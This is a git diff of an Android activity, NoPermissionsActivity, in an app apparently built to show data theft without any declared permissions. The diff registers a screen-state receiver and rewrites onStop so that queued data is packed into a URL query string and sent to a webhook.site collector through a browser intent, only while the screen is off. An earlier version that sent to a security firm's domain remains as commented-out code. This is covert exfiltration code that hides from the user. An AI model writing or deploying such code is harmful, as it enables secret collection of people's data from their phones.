@@ -3,6 +3,7 @@ package boku.no.nopermission;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.BroadcastReceiver;
+import android.content.IntentFilter;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.hardware.display.DisplayManager;
@@ -42,6 +43,11 @@ public class NoPermissionsActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
         rand = new Random(System.currentTimeMillis());
+
+        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        BroadcastReceiver mReceiver = new ScreenReceiver();
+        registerReceiver(mReceiver, filter);
     }
 
     public void buttonHandler(View view) {
@@ -276,20 +282,53 @@ public class NoPermissionsActivity extends Activity {
 
     //------ overridden lifecycle methods ------
 
+//    @Override
+//    protected void onPause() {
+//        if (!isScreenOn()) {
+//            StringBuilder sb = new StringBuilder("http://leviathansecurity.com/?noperms&");
+//            for (String queuedString : dataToUpload) {
+//                sb.append(queuedString).append('&');
+//            }
+//            dataToUpload.clear();
+//            String request = sb.toString();
+//            Log.d(TAG, "Uploading: " + request);
+//            Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(request));
+//            startActivity(myIntent);
+//        }
+//        if (ScreenReceiver.screenActive) {
+//            // THIS IS THE CASE WHEN ONPAUSE() IS CALLED BY THE SYSTEM DUE TO A SCREEN STATE CHANGE
+//            Log.d(TAG, "screen on");
+//        } else {
+//            Log.d(TAG, "screen off");
+//
+//        }
+//        super.onPause();
+//    }
+
     @Override
-    protected void onPause() {
-        if (!isScreenOn()) {
-            StringBuilder sb = new StringBuilder("http://leviathansecurity.com/?noperms&");
-            for (String queuedString : dataToUpload) {
-                sb.append(queuedString).append('&');
+    protected void onStop() {
+        super.onStop();
+        if (!dataToUpload.isEmpty()) {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            boolean isScreenOn;
+            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                isScreenOn = pm.isInteractive();
+            } else {
+                isScreenOn = pm.isScreenOn();// deprecated after API 21
             }
-            dataToUpload.clear();
-            String request = sb.toString();
-            Log.d(TAG, "Uploading: " + request);
-            Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(request));
-            startActivity(myIntent);
+            if (!isScreenOn) {
+                Log.d(TAG, "The screen is off: uploading data...");
+                StringBuilder sb = new StringBuilder("https://webhook.site/5ebd6968-4d2b-4c72-84a4-c3f491311c3e/?noperms&");
+                for (String queuedString : dataToUpload) {
+                    sb.append(queuedString).append('&');
+                }
+                dataToUpload.clear();
+                String request = sb.toString();
+                Log.d(TAG, "Uploading: " + request);
+                Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(request));
+                startActivity(myIntent);
+            }
         }
-        super.onPause();
     }
 
     @Override
